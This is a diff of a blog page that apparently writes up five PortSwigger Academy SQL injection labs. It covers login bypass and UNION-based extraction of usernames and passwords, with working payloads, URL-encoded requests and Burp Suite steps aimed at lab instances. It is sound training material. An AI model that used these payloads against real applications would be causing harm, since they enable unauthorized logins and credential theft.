@@ -243,7 +243,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "458"
+    "wordCount": "2236"
   }]
   </script>
 
@@ -805,9 +805,34 @@
     class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><strong>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</strong></a>
       <ul>
-        <li><a href="#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></li>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-vulnerability-allowing-login-bypass"><strong>Lab: SQL injection vulnerability allowing login bypass</strong></a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query"><strong>Lab: SQL injection UNION attack, determining the number of columns returned by the query</strong></a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-union-attack-finding-a-column-containing-text"><strong>Lab: SQL injection UNION attack, finding a column containing text</strong></a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables"><strong>Lab: SQL injection UNION attack, retrieving data from other tables</strong></a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#solution-4">Solution</a></li>
       </ul>
     </li>
   </ul>
@@ -823,9 +848,34 @@
     class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><strong>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</strong></a>
       <ul>
-        <li><a href="#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></li>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-vulnerability-allowing-login-bypass"><strong>Lab: SQL injection vulnerability allowing login bypass</strong></a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query"><strong>Lab: SQL injection UNION attack, determining the number of columns returned by the query</strong></a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-union-attack-finding-a-column-containing-text"><strong>Lab: SQL injection UNION attack, finding a column containing text</strong></a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables"><strong>Lab: SQL injection UNION attack, retrieving data from other tables</strong></a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#solution-4">Solution</a></li>
       </ul>
     </li>
   </ul>
@@ -840,17 +890,17 @@
     
     <div class="min-w-0 min-h-0 max-w-prose w-full">
       
-<h3 class="relative group">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
-    <div id="sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" class="anchor"></div>
+<h2 class="relative group"><strong>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</strong>
+    <div id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" aria-label="Anchor">#</a>
     </span>
     
-</h3>
+</h2>
 
-<h4 class="relative group">Description
+<h3 class="relative group">Description
     <div id="description" class="anchor"></div>
     
     <span
@@ -858,48 +908,39 @@
         <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#description" aria-label="Anchor">#</a>
     </span>
     
-</h4>
+</h3>
 <p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">released</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span></span></span></code></pre></div></div>
 <p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>
 
-<h4 class="relative group">Steps
-    <div id="steps" class="anchor"></div>
+<h3 class="relative group">Solution
+    <div id="solution" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#steps" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solution" aria-label="Anchor">#</a>
     </span>
     
-</h4>
-
-<h5 class="relative group">Step 1: Understanding the mechanism
-    <div id="step-1-understanding-the-mechanism" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#step-1-understanding-the-mechanism" aria-label="Anchor">#</a>
-    </span>
-    
-</h5>
-<p>When you click on a category like <code>Accessories</code>, the application makes a request to: <code>filter?category=Accesories</code></p>
-<p>Behind the scenes, the database executes a query that looks something like this:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">`</span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">released</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="o">`</span></span></span></code></pre></div></div>
-<p>The <code>released = 1</code> condition is what hides the unreleased products from regular users, the main goal is to break out (or ignore) this logic so the database ignore the restriction and returns everything</p>
-
-<h5 class="relative group">Steps 2: Intercept the Request
-    <div id="steps-2-intercept-the-request" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#steps-2-intercept-the-request" aria-label="Anchor">#</a>
-    </span>
-    
-</h5>
+</h3>
+<p><strong>The Mechanism</strong></p>
+<p>When filtering by category, the application uses the following backend query, where <code>released = 1</code> hides unreleased products from regular users: <code>SELECT * FROM products WHERE category = '[INPUT]' AND released = 1</code></p>
+<p><strong>The Payload</strong></p>
+<p>We need to inject a logical statement that is always true and comment out the rest of the original query to bypass the <code>released = 1</code> restriction.</p>
+<ul>
+<li><strong>Raw Payload:</strong> <code>' OR 1=1--</code></li>
+<li><strong>Resulting Query:</strong> <code>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1</code></li>
+<li><strong>Breakdown:</strong>
+<ul>
+<li><code>'</code> closes the string literal for the category parameter.</li>
+<li><code>OR 1=1</code> is a statement that always evaluates to true, causing the database to return all items regardless of category.</li>
+<li><code>--</code> is the SQL comment indicator, telling the database to ignore the <code>AND released = 1</code> condition.</li>
+</ul>
+</li>
+</ul>
+<p><strong>Execution Steps</strong></p>
 <ol>
-<li>Using Burp Suite Proxy Tab, turn Intercept on</li>
-<li>In your browser, click on <code>Accessories</code> (or any other category) on the labs Homepage</li>
-<li>Burp Suite will catch the GET request that looks like this<figure><img
+<li>Turn on <strong>Burp Suite Proxy Intercept</strong>.</li>
+<li>Click on any category on the homepage (e.g., Accessories) to capture the <code>GET /filter?category=Accessories</code> request.<figure><img
     class="my-0 rounded-md"
     loading="lazy"
     decoding="async"
@@ -908,46 +949,14 @@
     src="Pasted%20image%2020260420001356.png"
     ></figure>
 </li>
-</ol>
-
-<h5 class="relative group">Steps 3: Craft and Inject the Payload
-    <div id="steps-3-craft-and-inject-the-payload" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#steps-3-craft-and-inject-the-payload" aria-label="Anchor">#</a>
-    </span>
-    
-</h5>
-<p>You need to inject a logical statement that is always true, and then comment out the rest of the original query. The classic payload for this is <code>' OR 1=1--</code></p>
+<li>Send the intercepted request to <strong>Repeater (Ctrl+R)</strong> for safe testing.</li>
+<li>Modify the <code>category</code> parameter in the request line, ensuring the spaces are URL-encoded (using <code>+</code> or <code>%20</code>).
 <ul>
-<li><code>'</code> closes the string literal for the category.</li>
-<li><code>OR 1=1</code> is a statement that always evaluates to true.</li>
-<li><code>--</code> is the SQL comment indicator, which tells the database to ignore the rest of the query (specifically the <code>AND released = 1</code> part).</li>
+<li><em>Modified request line:</em> <code>GET /filter?category=Accessories'+OR+1=1-- HTTP/1.1</code></li>
 </ul>
-<ol>
-<li>In Burp Suite, right-click the intercepted request and select <strong>&ldquo;Send to Repeater&rdquo;</strong> (<code>Ctrl+R</code>). This allows you to test the payload safely.</li>
-<li>Go to the <strong>Repeater</strong> tab.</li>
-<li>Modify the first line of the request to append the payload to the category parameter. You should URL-encode the spaces. Your request should now look like this: <code>GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1</code></li>
-</ol>
-
-<h5 class="relative group">Step 4: Execute and Verify
-    <div id="step-4-execute-and-verify" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#step-4-execute-and-verify" aria-label="Anchor">#</a>
-    </span>
-    
-</h5>
-<ol>
-<li>In the Repeater tab, click <strong>&ldquo;Send&rdquo;</strong>.</li>
-<li>Look at the Response panel on the right. You should see a <code>200 OK</code> status. If you render or search the HTML, you will notice it now contains details for unreleased products that were previously hidden.</li>
-<li>To officially clear the lab, you must trigger this in the browser. You can either:
-<ul>
-<li>Go back to the <strong>Proxy</strong> tab, modify the intercepted request exactly as you did in Repeater, and click <strong>&ldquo;Forward&rdquo;</strong>.</li>
-<li>Turn Intercept off, and simply paste the payload directly into your browser&rsquo;s URL bar: <code>https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts'+OR+1=1--</code>
-Once the page loads with the injected payload, the &ldquo;Congratulations, you solved the lab!&rdquo; banner will appear. Document this payload in your notes and mark today&rsquo;s system repetition as complete.<figure><img
+</li>
+<li>Click <strong>Send</strong>. Look at the Response panel—we should see a <code>200 OK</code> status, and rendering the HTML will reveal previously hidden unreleased products.</li>
+<li>To officially solve the lab, either forward the modified request via the <strong>Proxy</strong> tab or paste the URL-encoded payload directly into your browser&rsquo;s address bar: <code>https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories'+OR+1=1--</code><figure><img
     class="my-0 rounded-md"
     loading="lazy"
     decoding="async"
@@ -956,7 +965,548 @@ Once the page loads with the injected payload, the &ldquo;Congratulations, you s
     src="Pasted%20image%2020260420002942.png"
     ></figure>
 </li>
+</ol>
+
+<h2 class="relative group"><strong>Lab: SQL injection vulnerability allowing login bypass</strong>
+    <div id="lab-sql-injection-vulnerability-allowing-login-bypass" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lab-sql-injection-vulnerability-allowing-login-bypass" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">Description
+    <div id="description-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#description-1" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>This lab contains a SQL injection vulnerability in the login function.</p>
+<p>To solve the lab, perform a SQL injection attack that logs in to the application as the <code>administrator</code> user.</p>
+
+<h3 class="relative group">Solution
+    <div id="solution-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solution-1" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><strong>The Mechanism</strong></p>
+<p>The application uses the following backend query to validate user credentials: <code>SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'</code></p>
+<p><strong>The Payload</strong></p>
+<p>We can bypass the password check entirely by passing a valid username, closing the string, and using a SQL comment to drop the remainder of the query.</p>
+<ul>
+<li><strong>Payload:</strong> <code>administrator'--</code></li>
+<li><strong>Resulting Query:</strong> <code>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''</code></li>
+<li><strong>Breakdown:</strong>
+<ul>
+<li><code>administrator</code> targets the specific, highly privileged user account.</li>
+<li><code>'</code> closes the username string literal.</li>
+<li><code>--</code> comments out the rest of the query (specifically the <code>AND password =</code> check), making the password field completely irrelevant.
+<strong>Execution Steps</strong></li>
 </ul>
+</li>
+</ul>
+<ol>
+<li>Turn on <strong>Burp Suite Proxy Intercept</strong>.</li>
+<li>Navigate to the Login page, type in any dummy credentials, click &ldquo;Log in&rdquo;, and capture the <code>POST /login</code> request.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420221800.png"
+    ></figure>
+</li>
+<li>Send the request to <strong>Repeater (Ctrl+R)</strong>.</li>
+<li>Modify the <code>username</code> parameter to include the payload:
+<ul>
+<li><em>Modified parameter:</em> <code>username=administrator'--</code></li>
+<li><em>(Note: The <code>password</code> and <code>csrf</code> parameters can be left as-is, as the comment drops the password check anyway).</em></li>
+</ul>
+</li>
+<li>Click <strong>Send</strong>. We should receive a <code>302 Found</code> redirect, indicating a successful login bypass.</li>
+<li>To officially solve the lab, forward the modified request from your <strong>Proxy</strong> tab to the browser.</li>
+</ol>
+<p>Once the page loads with the injected payload, the &ldquo;Congratulations, you solved the lab!&rdquo; banner will appear.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420222704.png"
+    ></figure>
+</p>
+
+<h2 class="relative group"><strong>Lab: SQL injection UNION attack, determining the number of columns returned by the query</strong>
+    <div id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">Description
+    <div id="description-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#description-2" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&rsquo;s response, so we can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. We will then use this technique in subsequent labs to construct the full attack.</p>
+<p>To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.</p>
+
+<h3 class="relative group">Solution
+    <div id="solution-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solution-2" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><strong>The Mechanism</strong></p>
+<p>The application filters products using a query similar to: <code>SELECT * FROM products WHERE category = '[INPUT]'</code></p>
+<p>By injecting a <code>UNION SELECT</code> statement, we can force the database to append the results of your injected query to the original results. However, a <code>UNION</code> operation has a strict rule: <strong>both queries must return the exact same number of columns</strong>.</p>
+<ul>
+<li>
+<p>If your injected query asks for a different number of columns than the original query, the database will throw an error (resulting in an HTTP 500 Internal Server Error).</p>
+</li>
+<li>
+<p>By incrementally adding columns to your injected query until the error disappears, we can deduce the exact column count.</p>
+</li>
+</ul>
+<p><strong>The Payloads</strong> We use <code>NULL</code> values because they are compatible with any data type. If we guessed text or integers, the query might still fail due to data type mismatches.</p>
+<ul>
+<li>
+<p><strong>Test 1 Column:</strong> <code>' UNION SELECT NULL--</code></p>
+</li>
+<li>
+<p><strong>Test 2 Columns:</strong> <code>' UNION SELECT NULL, NULL--</code></p>
+</li>
+<li>
+<p><strong>Test 3 Columns:</strong> <code>' UNION SELECT NULL, NULL, NULL--</code></p>
+</li>
+</ul>
+<p><strong>Execution Steps</strong></p>
+<ol>
+<li>
+<p>Turn on <strong>Burp Suite Proxy Intercept</strong>.</p>
+</li>
+<li>
+<p>Click on any category filter on the homepage (e.g., Corporate Gifts) to capture the `GET /filter?category=Corporate+gifts request.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420225857.png"
+    ></figure>
+</p>
+</li>
+<li>
+<p>Send the intercepted request to <strong>Repeater (Ctrl+R)</strong>.</p>
+</li>
+<li>
+<p>Modify the <code>category</code> parameter to test for one column. Ensure we URL-encode the spaces (using <code>+</code> or <code>%20</code>).</p>
+<ul>
+<li><em>Modified parameter:</em> <code>category=Coporate+gifts'+UNION+SELECT+NULL--</code></li>
+</ul>
+</li>
+<li>
+<p>Click <strong>Send</strong>. Look at the Response panel. We will likely see a <code>500 Internal Server Error</code>, meaning the column count is incorrect.</p>
+</li>
+<li>
+<p>Add another <code>NULL</code> to the payload and send it again:</p>
+<ul>
+<li>
+<p><em>Modified parameter:</em> <code>category=Gifts'+UNION+SELECT+NULL,NULL--</code></p>
+</li>
+<li>
+<p>Observe the <code>500 Internal Server Error</code>.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Add a third <code>NULL</code> to the payload and send it again:</p>
+<ul>
+<li><em>Modified parameter:</em> <code>category=Gifts'+UNION+SELECT+NULL,NULL,NULL--</code><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420230048.png"
+    ></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Observe the Response panel. We should now receive a <code>200 OK</code> status. This confirms the original query returns exactly 3 columns.</p>
+</li>
+<li>
+<p>To officially solve the lab, either forward this successful request from your <strong>Proxy</strong> tab.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420230227.png"
+    ></figure>
+</p>
+</li>
+</ol>
+
+<h2 class="relative group"><strong>Lab: SQL injection UNION attack, finding a column containing text</strong>
+    <div id="lab-sql-injection-union-attack-finding-a-column-containing-text" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lab-sql-injection-union-attack-finding-a-column-containing-text" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">Description
+    <div id="description-3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#description-3" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&rsquo;s response, so we can use a UNION attack to retrieve data from other tables. To construct such an attack, we first need to determine the number of columns returned by the query. We can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.</p>
+<p>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</p>
+
+<h3 class="relative group">Solution
+    <div id="solution-3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solution-3" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><strong>The Mechanism</strong></p>
+<p>Once we know the number of columns returned by the original query (in this case, 3 columns), we must determine their data types. A <code>UNION</code> query will only execute successfully if the data types of the injected columns match the data types of the original columns.</p>
+<p>If we try to inject text into a column that expects an integer, the database will throw an error. To find the text column, we must systematically replace the <code>NULL</code> values in your payload with the target text string, one column at a time, until the query executes successfully.</p>
+<p><strong>The Payload</strong></p>
+<p>The lab will generate a random, unique string that we must retrieve (for this example, we will use the given string: <code>'ddWY5L'</code>). We will test the columns sequentially.</p>
+<ul>
+<li>
+<p><strong>Test Column 1:</strong> <code>' UNION SELECT 'ddWY5L', NULL, NULL--</code> (Assume this fails)</p>
+</li>
+<li>
+<p><strong>Test Column 2 (Successful Payload):</strong> <code>' UNION SELECT NULL, 'ddWY5L', NULL--</code></p>
+</li>
+<li>
+<p><strong>Resulting Query:</strong> <code>SELECT * FROM products WHERE category = 'Accessories' UNION SELECT NULL, 'ddWY5L', NULL--'</code></p>
+</li>
+<li>
+<p><strong>Breakdown:</strong></p>
+<ul>
+<li>
+<p><code>'</code> closes the initial string literal for the category.</p>
+</li>
+<li>
+<p><code>UNION SELECT</code> appends our malicious query.</p>
+</li>
+<li>
+<p><code>NULL, 'ddWY5L', NULL</code> tests if the <em>second</em> column can accept text data while keeping the other columns neutral.</p>
+</li>
+<li>
+<p><code>--</code> comments out the remainder of the original query.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Execution Steps</strong></p>
+<ol>
+<li>
+<p>Turn on <strong>Burp Suite Proxy Intercept</strong>.</p>
+</li>
+<li>
+<p>Click on any category on the homepage to capture the `GET /filter?category=Accessories request.</p>
+</li>
+<li>
+<p>Send the intercepted request to <strong>Repeater (Ctrl+R)</strong>.</p>
+</li>
+<li>
+<p>Check the lab instructions to find the specific random string we need to echo back (e.g., <code>AWN3ON</code>).</p>
+</li>
+<li>
+<p>Test the first column by placing the string in the first position (remembering to URL-encode spaces):</p>
+<ul>
+<li>
+<p><em>Modified parameter:</em> <code>category=Gifts'+UNION+SELECT+'ddWY5L',NULL,NULL--</code></p>
+</li>
+<li>
+<p>Click <strong>Send</strong>. If we receive a <code>500 Internal Server Error</code>, this column does not accept text.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Test the second column by moving the string to the second position:</p>
+<ul>
+<li><em>Modified parameter:</em> <code>category=Accessories'+UNION+SELECT+NULL,'ddWY5L',NULL--</code>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420234509.png"
+    ></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Click <strong>Send</strong>. Look at the Response panel. If we receive a <code>200 OK</code> status and can see your string rendered in the HTML response, we have successfully found the text column.</p>
+</li>
+<li>
+<p>To officially solve the lab, forward this successful request from your <strong>Proxy</strong> tab or paste the final URL-encoded payload directly into your browser&rsquo;s address bar.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420234600.png"
+    ></figure>
+</p>
+</li>
+</ol>
+
+<h2 class="relative group"><strong>Lab: SQL injection UNION attack, retrieving data from other tables</strong>
+    <div id="lab-sql-injection-union-attack-retrieving-data-from-other-tables" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">Description
+    <div id="description-4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#description-4" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.</p>
+<p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.</p>
+
+<h3 class="relative group">Solution
+    <div id="solution-4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solution-4" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><strong>The Mechanism</strong></p>
+<p>Once we have determined how many columns the original query returns and which of those columns accept text (in this specific lab, it is <strong>two columns, both accepting text</strong>), we can leverage a <code>UNION SELECT</code> to pull data from entirely different tables in the database.</p>
+<p>By querying the <code>users</code> table and asking for the <code>username</code> and <code>password</code> columns, the database will append those credentials directly into the product listing on the webpage.</p>
+<p><strong>The Payload</strong></p>
+<p>We will replace the <code>NULL</code> values or test strings from our previous reconnaissance with the actual column names we want to extract from the <code>users</code> table.</p>
+<ul>
+<li>
+<p><strong>Payload:</strong> <code>' UNION SELECT username, password FROM users--</code></p>
+</li>
+<li>
+<p><strong>Resulting Query:</strong> <code>SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'</code></p>
+</li>
+<li>
+<p><strong>Breakdown:</strong></p>
+<ul>
+<li>
+<p><code>'</code> closes the initial string literal for the category filter.</p>
+</li>
+<li>
+<p><code>UNION SELECT username, password</code> instructs the database to fetch these specific columns. Since there are exactly two columns requested, they map perfectly to the original query&rsquo;s two-column output.</p>
+</li>
+<li>
+<p><code>FROM users</code> specifies the hidden table we are targeting.</p>
+</li>
+<li>
+<p><code>--</code> comments out the remainder of the original query.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Execution Steps</strong></p>
+<ol>
+<li>
+<p>Turn on <strong>Burp Suite Proxy Intercept</strong>.</p>
+</li>
+<li>
+<p>Click on any category on the homepage to capture the <code>GET /filter?category=Gifts</code> request.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420235449.png"
+    ></figure>
+</p>
+</li>
+<li>
+<p>Send the intercepted request to <strong>Repeater (Ctrl+R)</strong>.</p>
+</li>
+<li>
+<p>Modify the <code>category</code> parameter with your payload, ensuring all spaces are URL-encoded:</p>
+<ul>
+<li><em>Modified parameter:</em> <code>category=Gifts'+UNION+SELECT+username,password+FROM+users--</code>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420235356.png"
+    ></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Click <strong>Send</strong>.</p>
+</li>
+<li>
+<p>Look at the Response panel and scroll through the rendered HTML (or use the search bar at the bottom for &ldquo;administrator&rdquo;). We will see the usernames and their corresponding plaintext passwords listed as if they were product names and descriptions.</p>
+</li>
+<li>
+<p>Copy the password associated with the <code>administrator</code> account.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420235551.png"
+    ></figure>
+</p>
+</li>
+<li>
+<p>To officially solve the lab, navigate to the <strong>&ldquo;My account&rdquo;</strong> login page in your browser. Log in using <code>administrator</code> and the password we just extracted.</p>
+</li>
+</ol>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260420235607.png"
